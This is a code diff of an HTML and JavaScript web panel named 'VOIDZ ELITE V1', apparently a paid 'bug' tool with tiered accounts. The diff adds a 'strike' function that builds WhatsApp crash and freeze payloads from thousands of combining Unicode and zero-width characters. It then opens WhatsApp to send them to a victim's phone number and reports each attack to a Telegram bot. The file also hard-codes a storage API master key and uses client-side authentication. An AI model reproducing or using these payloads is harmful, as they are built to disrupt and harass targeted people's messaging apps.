@@ -14,11 +14,11 @@
         #ash-canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 2; pointer-events: none; }
         .content-layer { position: relative; z-index: 10; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
         
-        .neon-text { color: var(--neon-red); text-shadow: 0 0 10px var(--neon-red), 0 0 20px var(--neon-red); font-family: 'Orbitron'; font-weight: 900; }
+        .neon-red { color: var(--neon-red); text-shadow: 0 0 10px var(--neon-red), 0 0 20px var(--neon-red); font-family: 'Orbitron'; font-weight: 900; }
         
-        /* LOGIN PAGE BALIK KE MODE LAMA */
+        /* LOGIN PAGE */
         #loginPage { flex: 1; display: flex; justify-content: center; align-items: center; z-index: 100; }
-        .login-box { width: 85%; max-width: 320px; background: var(--card); border: 1px solid #222; padding: 30px; border-radius: 15px; text-align: center; border-top: 3px solid var(--fire); position: relative; }
+        .login-box { width: 85%; max-width: 320px; background: var(--card); border: 1px solid #222; padding: 30px; border-radius: 15px; text-align: center; border-top: 3px solid var(--fire); }
         .profile-img { width: 85px; height: 85px; border-radius: 50%; border: 2px solid var(--fire); box-shadow: 0 0 15px var(--fire); margin-bottom: 20px; object-fit: cover; }
         
         .btn-main { width: 100%; background: var(--fire); color: #000; border: none; padding: 14px; font-weight: 900; cursor: pointer; border-radius: 5px; font-family: 'Orbitron'; }
@@ -33,7 +33,7 @@
         .info-val { font-size: 14px; font-weight: 900; font-family: 'Orbitron'; }
 
         /* LOGS AREA */
-        #logContent { background: #050505; border: 1px solid #222; padding: 10px; height: 100%; overflow-y: auto; font-size: 9px; color: #0f0; line-height: 1.5; border-radius: 5px; }
+        #logContent { background: #050505; border: 1px solid #222; padding: 10px; height: 300px; overflow-y: auto; font-size: 9px; color: #0f0; line-height: 1.5; border-radius: 5px; }
         .log-entry { margin-bottom: 5px; border-bottom: 1px solid #111; padding-bottom: 2px; }
 
         .tab-content { display: none; padding: 15px; overflow-y: auto; height: 100%; padding-top: 10px; padding-bottom: 80px; }
@@ -54,7 +54,7 @@
         <div id="loginPage">
             <div class="login-box">
                 <img src="login.jpg" class="profile-img" onerror="this.src='https://api.dicebear.com/7.x/pixel-art/svg?seed=voidz'">
-                <h2 class="neon-text" style="font-size: 16px; margin-bottom: 20px;">VOIDZ ELITE V1</h2>
+                <h2 class="neon-red" style="font-size: 16px; margin-bottom: 20px;">VOIDZ ELITE V1</h2>
                 <input type="text" id="lUser" class="input-box" placeholder="OPERATOR ID">
                 <input type="password" id="lPass" class="input-box" placeholder="ACCESS KEY">
                 <button type="button" onclick="auth()" class="btn-main" id="btnLog">IGNITE</button>
@@ -63,9 +63,9 @@
 
         <div id="mainApp" style="display:none; flex:1; overflow:hidden;">
             <div id="tabHOME" class="tab-content active-tab">
-                <div class="header-title neon-text">VOIDZ ELITE V1</div>
+                <div class="header-title neon-red">VOIDZ ELITE V1</div>
                 <div class="banner-container"><video id="homeVideo" loop muted playsinline style="width:100%; height:100%; object-fit:cover;"><source src="dashboard.mp4" type="video/mp4"></video></div>
-                <marquee style="color:var(--fire); font-size:9px; margin-bottom:10px;">[SYSTEM LIVE] - STATUS: SECURED - READY FOR DEPLOYMENT</marquee>
+                <marquee style="color:var(--fire); font-size:9px; margin-bottom:10px;">[SYSTEM LIVE] - WELCOME OPERATOR - MONITORING ACTIVE</marquee>
                 
                 <div class="home-info">
                     <div class="info-row"><i class="fas fa-user" style="color:var(--fire)"></i><span id="uName" class="info-val">...</span></div>
@@ -77,23 +77,21 @@
             </div>
 
             <div id="tabATTACK" class="tab-content">
-                <div class="header-title neon-text" style="margin-top:20px;">STRIKE CENTER</div>
-                <div style="background:var(--card); padding:15px; border-radius:10px; border:1px solid #222; margin:15px 0; border-top:2px solid #00e5ff">
-                    <h3 style="color:#00e5ff; font-size:12px; margin-bottom:10px; font-family:'Orbitron'">WIFI KILLER</h3>
-                    <input type="text" id="wifiIP" class="input-box" readonly style="color:#00e5ff">
-                    <input type="text" id="targetWiFi" class="input-box" placeholder="Target IP / Gateway">
-                    <button class="btn-main" style="background:#00e5ff" onclick="startAttack('WIFI')">KILL NETWORK</button>
-                </div>
-                <div style="background:var(--card); padding:15px; border-radius:10px; border:1px solid #222; border-top:2px solid var(--fire)">
+                <div class="header-title neon-red" style="margin-top:20px;">STRIKE CENTER</div>
+                <div style="background:var(--card); padding:15px; border-radius:10px; border:1px solid #222; border-top:2px solid var(--fire); margin-top:20px;">
                     <h3 style="color:var(--fire); font-size:12px; margin-bottom:10px; font-family:'Orbitron'">BUG SELECTOR</h3>
-                    <input type="text" id="targetBug" class="input-box" placeholder="Target WA / Android ID">
-                    <select id="bugType" class="input-box"><option value="WA_CRASH">WA CRASH</option><option value="IP_FREEZE">IP FREEZE</option></select>
-                    <button class="btn-main" onclick="startAttack('BUG')">EXECUTE</button>
+                    <input type="text" id="targetBug" class="input-box" placeholder="Target 628xxx">
+                    <select id="bugType" class="input-box">
+                        <option value="WA_CRASH">WA CRASH (LITE)</option>
+                        <option value="IP_FREEZE">IP FREEZE (MEDIUM)</option>
+                        <option value="SUPREME">SUPREME (HARD)</option>
+                    </select>
+                    <button class="btn-main" onclick="startAttack('BUG')">EXECUTE STRIKE</button>
                 </div>
             </div>
 
             <div id="tabLOGS" class="tab-content">
-                <div class="header-title neon-text" style="margin-top:20px; margin-bottom:15px;">TERMINAL LOGS</div>
+                <div class="header-title neon-red" style="margin-top:20px; margin-bottom:15px;">TERMINAL LOGS</div>
                 <div id="logContent"></div>
             </div>
         </div>
@@ -109,25 +107,17 @@
         <h3 style="color:var(--fire); font-size:12px; font-family:'Orbitron'">GENERATE UNIT</h3>
         <input type="text" id="gUser" class="input-box" placeholder="NEW ID" style="margin-top:15px;">
         <input type="text" id="gPass" class="input-box" placeholder="ACCESS KEY">
-        <select id="gRole" class="input-box" onchange="toggleQArea()"></select>
+        <select id="gRole" class="input-box"></select>
         <select id="gTime" class="input-box"></select>
-        <div id="qArea" style="display:none"><input type="number" id="gQuota" class="input-box" placeholder="SET QUOTA"></div>
         <button class="btn-main" onclick="doGenerate()" id="btnPush">PUSH UNIT</button>
         <button onclick="closeModal()" style="color:#444; width:100%; border:none; background:none; margin-top:10px; font-size:9px;">CANCEL</button>
-    </div></div>
-
-    <div id="modalConfig" class="modal"><div class="modal-content" style="border-color: #4b5320;">
-        <h3 style="color:#4b5320; font-size:12px; font-family:'Orbitron'"><i class="fas fa-satellite"></i> INTEL CONFIG</h3>
-        <input type="text" id="botToken" class="input-box" placeholder="BOT TOKEN TELEGRAM" style="margin-top:15px;">
-        <input type="text" id="chatID" class="input-box" placeholder="CHAT ID MARKAS">
-        <button class="btn-main" style="background:#4b5320; color:#fff;" onclick="saveConfig()">LOCK INTEL</button>
-        <button onclick="closeModal()" style="color:#444; width:100%; border:none; background:none; margin-top:10px; font-size:9px;">ABORT</button>
     </div></div>
 
     <script>
         const BIN_ID = '694a5a6fae596e708fabef99', API_KEY = '$2a$10$dgiow6eyY5CjGfEYQtuAQ.E6b5sEA7j91bc4IexzX9cWV3uAksXgW';
         let USER = {}, DB = {}, LOG_HISTORY = [];
 
+        // --- ASH PARTICLE ENGINE (BULET) ---
         const canvas = document.getElementById('ash-canvas');
         const ctx = canvas.getContext('2d');
         let particles = [];
@@ -138,7 +128,12 @@
         }
         function drawParticles() {
             ctx.clearRect(0,0,canvas.width, canvas.height); ctx.fillStyle = "rgba(200,200,200,0.5)";
-            particles.forEach(p => { ctx.beginPath(); ctx.arc(p.x, p.y, p.s, 0, Math.PI*2); ctx.fill(); p.y -= p.d; if(p.y < 0) p.y = canvas.height; });
+            particles.forEach(p => { 
+                ctx.beginPath(); 
+                ctx.arc(p.x, p.y, p.s, 0, Math.PI*2); // Pastikan Bulat
+                ctx.fill(); 
+                p.y -= p.d; if(p.y < 0) p.y = canvas.height; 
+            });
             requestAnimationFrame(drawParticles);
         }
         initParticles(); drawParticles();
@@ -156,13 +151,13 @@
         async function sendTele(msg) {
             const token = localStorage.getItem('v_token'), chat = localStorage.getItem('v_chat');
             if(!token || !chat) return;
-            const text = `╔════════════════════╗\n  VOIDZ MONITORING\n╚════════════════════╝\n[ID] : ${USER.id || 'Unknown'}\n[ACT]: ${msg}`;
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(text)}`);
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent("VOIDZ SPY: " + msg)}`);
         }
 
+        // --- AUTH SYSTEM (IGNITE BUTTON) ---
         async function auth() {
             const u = document.getElementById('lUser').value.trim(), p = document.getElementById('lPass').value.trim(), btn = document.getElementById('btnLog');
-            if(!u || !p) return notify("LENGKAPI DATA!");
+            if(!u || !p) return notify("DATA KOSONG!");
             btn.disabled = true; btn.innerText = "IGNITING...";
             try {
                 const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, { headers: { 'X-Master-Key': API_KEY, 'X-Bin-Meta': false } });
@@ -172,11 +167,8 @@
                     document.getElementById('loginPage').style.display = 'none';
                     document.getElementById('mainApp').style.display = 'block';
                     document.getElementById('bottomNav').style.display = 'flex';
-                    if(USER.role === 'owner') {
-                        document.getElementById('navLogs').style.display = 'flex';
-                        addTerminalLog("SYSTEM", "OWNER ACCESS GRANTED");
-                    }
-                    renderHome(); getIP(); sendTele("LOGIN SUCCESS");
+                    if(USER.role === 'owner') document.getElementById('navLogs').style.display = 'flex';
+                    renderHome(); addTerminalLog("SYSTEM", "AUTHORIZED SUCCESS");
                     document.getElementById('homeVideo').play();
                 } else { throw "ERR"; }
             } catch(e) { notify("AKSES DITOLAK!"); btn.disabled = false; btn.innerText = "IGNITE"; }
@@ -184,48 +176,54 @@
 
         function renderHome() {
             document.getElementById('uName').innerText = USER.id;
-            const rEl = document.getElementById('uRole');
-            rEl.innerText = USER.role.toUpperCase();
-            if(USER.role === 'owner') rEl.classList.add('neon-text');
+            document.getElementById('uRole').innerText = USER.role.toUpperCase();
             document.getElementById('uQuota').innerText = USER.role === 'owner' ? '∞' : USER.quota;
             document.getElementById('uExp').innerText = USER.exp;
             
             const m = document.getElementById('menuContainer'); m.innerHTML = "";
-            m.innerHTML += `<div onclick="notify('IP: ' + document.getElementById('wifiIP').value)" style="background:var(--card); padding:15px; text-align:center; border:1px solid #00ff00; border-radius:10px;"><i class="fas fa-network-wired" style="color:#00ff00"></i><br><span style="font-size:9px;">IP LOOKUP</span></div>`;
-            m.innerHTML += `<div onclick="notify('OS: ' + navigator.platform)" style="background:var(--card); padding:15px; text-align:center; border:1px solid #ff00ff; border-radius:10px;"><i class="fas fa-mobile-alt" style="color:#ff00ff"></i><br><span style="font-size:9px;">DEVICE</span></div>`;
             if(USER.role !== 'member') m.innerHTML += `<div onclick="openGen()" style="background:var(--card); padding:15px; text-align:center; border:1px solid var(--fire); border-radius:10px;"><i class="fas fa-plus" style="color:var(--fire)"></i><br><span style="font-size:9px;">GENERATE</span></div>`;
-            if(USER.role === 'owner') m.innerHTML += `<div onclick="openModal('modalConfig')" style="background:var(--card); padding:15px; text-align:center; border:1px solid #4b5320; border-radius:10px;"><i class="fas fa-satellite-dish" style="color:#4b5320"></i><br><span style="font-size:9px;">CONFIG</span></div>`;
             m.innerHTML += `<div onclick="location.reload()" style="background:var(--card); padding:15px; text-align:center; border:1px solid #444; border-radius:10px;"><i class="fas fa-power-off" style="color:#444"></i><br><span style="font-size:9px;">EXIT</span></div>`;
         }
 
-        function openGen() { openModal('modalGen'); const r = document.getElementById('gRole'), t = document.getElementById('gTime'); if(USER.role === 'owner') { r.innerHTML = '<option value="member">MEMBER</option><option value="reseller">RESELLER</option>'; t.innerHTML = '<option value="1 MONTH">1 MONTH</option><option value="LIFETIME">LIFETIME</option>'; } else { r.innerHTML = '<option value="member">MEMBER</option>'; t.innerHTML = '<option value="1 MONTH">1 MONTH</option>'; } toggleQArea(); }
-        function toggleQArea() { document.getElementById('qArea').style.display = (document.getElementById('gRole').value === 'reseller' && USER.role === 'owner') ? 'block' : 'none'; }
-
-        async function doGenerate() {
-            const u = document.getElementById('gUser').value.trim(), p = document.getElementById('gPass').value.trim(), r = document.getElementById('gRole').value;
-            if(!u || !p) return notify("DATA KOSONG!");
-            try {
-                await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, { headers: { 'X-Master-Key': API_KEY, 'X-Bin-Meta': false } }).then(res=>res.json()).then(async d=>{
-                    d[u]={pw:p, role:r, exp:document.getElementById('gTime').value, quota:parseInt(document.getElementById('gQuota').value)||0};
-                    await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, { method:'PUT', headers:{'Content-Type':'application/json','X-Master-Key':API_KEY}, body:JSON.stringify(d)});
-                    addTerminalLog("GENERATE", `CREATED ${r.toUpperCase()}: ${u}`);
-                    sendTele(`GENERATE: ${u}`); notify("UNIT PUSHED!"); closeModal();
-                });
-            } catch(e) { notify("FAILED!"); }
-        }
-
+        // --- REDIRECT STRIKE SYSTEM ---
         function startAttack(m) {
-            const target = m === 'WIFI' ? document.getElementById('targetWiFi').value : document.getElementById('targetBug').value;
+            const target = document.getElementById('targetBug').value.trim();
             if(!target) return notify("TARGET KOSONG!");
-            addTerminalLog("STRIKE", `METHOD: ${m} | TARGET: ${target}`);
-            sendTele(`STRIKE: ${m} ON ${target}`); notify("EXECUTED!");
+
+            const confirmStrike = confirm("--- VOIDZ ELITE STRIKE ---\nLanjutkan eksekusi ke WhatsApp?");
+            if(!confirmStrike) return notify("ABORTED");
+
+            const type = document.getElementById('bugType').value;
+            let payload = "";
+            if(type === 'WA_CRASH') payload = "VOIDZ-LITE ⚡\n" + "ฏ๎๎๎".repeat(50);
+            else if(type === 'IP_FREEZE') payload = "VOIDZ-MED ❄️\n" + "\u200B".repeat(2500) + "జ్ఞ‌ా".repeat(150);
+            else payload = "VOIDZ-SUPREME 💀\n" + "ꦾ".repeat(1000) + "҉".repeat(500) + "ฏ๎๎๎".repeat(100);
+
+            // Copy Backup
+            const t = document.createElement("textarea"); t.value = payload; document.body.appendChild(t);
+            t.select(); document.execCommand("copy"); document.body.removeChild(t);
+
+            // Redirect
+            let cleanNum = target.replace(/\D/g, ''); 
+            if(cleanNum.startsWith('0')) cleanNum = '62' + cleanNum.slice(1);
+            
+            notify("OPENING WHATSAPP...");
+            setTimeout(() => {
+                window.open(`https://api.whatsapp.com/send?phone=${cleanNum}&text=${encodeURIComponent(payload)}`, '_blank');
+                addTerminalLog("STRIKE", `BUG SENT TO ${cleanNum}`);
+                sendTele(`ATTACK ON ${cleanNum}`);
+            }, 1000);
         }
 
-        async function getIP() { try { const res = await fetch('https://api.ipify.org?format=json'); const data = await res.json(); document.getElementById('wifiIP').value = data.ip; } catch(e) { document.getElementById('wifiIP').value = "127.0.0.1"; } }
-        function switchTab(t, el) { document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active-tab')); document.getElementById('tab'+t.toUpperCase()).classList.add('active-tab'); document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active')); el.classList.add('active'); if(t === 'logs') { const c = document.getElementById('logContent'); if(c) c.innerHTML = LOG_HISTORY.join(''); } }
-        function openModal(id) { document.getElementById(id).style.display = 'flex'; }
+        function switchTab(t, el) { 
+            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active-tab')); 
+            document.getElementById('tab'+t.toUpperCase()).classList.add('active-tab'); 
+            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active')); 
+            el.classList.add('active'); 
+        }
+
+        function openGen() { document.getElementById('modalGen').style.display = 'flex'; const r = document.getElementById('gRole'), t = document.getElementById('gTime'); r.innerHTML = '<option value="member">MEMBER</option>'; t.innerHTML = '<option value="1 MONTH">1 MONTH</option>'; }
         function closeModal() { document.querySelectorAll('.modal').forEach(m => m.style.display = 'none'); }
-        function saveConfig() { localStorage.setItem('v_token', document.getElementById('botToken').value); localStorage.setItem('v_chat', document.getElementById('chatID').value); notify("INTEL LOCKED!"); closeModal(); addTerminalLog("CONFIG", "TELE INTEL UPDATED"); }
     </script>
 </body>
 </html>
